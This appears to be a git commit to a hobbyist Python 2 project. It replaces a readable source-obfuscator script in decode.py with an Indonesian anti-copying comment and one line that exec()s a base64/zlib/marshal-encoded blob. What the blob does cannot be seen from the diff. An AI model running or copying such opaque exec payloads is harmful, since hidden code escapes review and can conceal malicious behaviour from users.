221b7466672560a6b7dd736750eeaffa684ab880
Reza-XD <94230332+Reaper-XD@users.noreply.github.com>
2022-01-04 00:30:08 +0700

    Update decode.py

--- decode.py
+++ decode.py
@@ -1,38 +1,6 @@
-# module
-import marshal, zlib, base64, os, sys, random
-HJ = "\33[0;32m"
-HT = "\33[30;1m"
-K = "\33[33;1m"
-KT = "\33[1;33m"
-P = "\33[37;1m"
-M = "\33[31;1m"
-BM = "\33[36;1m"
-B = "\33[0;36m"
-HJT = "\33[32;1m"
-U = "\33[35;1m"
-
-my_color = [
-    HJ, HT, K, KT, B, BM, M, HJT, U, P ]
-warna = random.choice(my_color)
-os.system("clear")
-os.system("figlet CODE")
-print "%s__________________________"%(K)
-print "%s(%sI%s)%sWELCOME TO MY SCRIPT%s(%sI%s)" %(HT,M,HT,KT,HT,M,HT)
-print "%s__________________________"%(K)
-try:
-    r = sys.argv[1]
-except:
-    exit("usage : python2 decode.py file.py")
-
-if not os.path.isfile(r):
-    exit("\033[31;1mFile Tidak Ditemukan!")
-
-a = open(r).read()
-b = marshal.dumps(a)
-c = zlib.compress(b)
-d = base64.b64encode(c)
-
-sv = 'import marshal, zlib, base64\nexec(marshal.loads(zlib.decompress(base64.b64decode("{}"))))'
-
-open("code_.py", "w").write(sv.format(d))
-exit("\033[;0mberhasil : save to as code_.py")
+##############################
+##GAK PAHAM ELU YANG PEMULA ##
+## RECODE IZIN DULU SAMA GUA##
+##############################
+import marshal, zlib, base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJyVUm1r2zAQLuybfsVNw1QGI5K4y6BhX5p2pElDwpYyRlKCbCuJqG0ZSXnb2B/ar9zZbtyWscEOIfmeO92je3z215uzs3eQ6WSbSqKyQhsHmTB2I9IAvqcqCiASVnYvAtA2AHvEzYg80RkZDOEj0EUYzlu9sJNRMpidgLDVayMwavyw9puEdi8MEZg2CR+qhHHjtyv/6hno1sALym5JOXzm7FQZ943/vvJJdlzGOtUG8TkBtMEwgMEsgBEuPK5wjQPAhcUCuA9gCg9kL0wu8ErdK483WsWSnWr5RFuOWjiZMRqnUhj6ClqpdSod9CfXNxgojModUM8u/2rUY6MXicyzt571Pfv15q4/Gd/AbALjb/Cl//l2OmvCFDyGjYwD3LCTp8//4HPmeFlJUoqDb+fCrHfz9gORh1gWro7Jg3KMLlooaa+Vba1YS7iE4ug2Ou9AImOdSF4cYaXS8sR+iVpBrh0ODC+E23Blyxgz/h8Fq9/8CYMwU4l4hGuF8m0fRf62LFPqrwuZ401upEiYTyKEnsaTJ9ussEz4JEawHFUe66ww0loW+SRBsJ5cHnUvZF4+k8VY1e4wcv6vUV/k8iBjduJJtUgsqwjKbk8UTe1aAkZ//KQ+2jkh1aNpiS5LRQKge+rzvcHumN3xlTaZcCzxffJa3EiajbAqRX2t2ElwGoSFpo5PfgOsahUy"))))
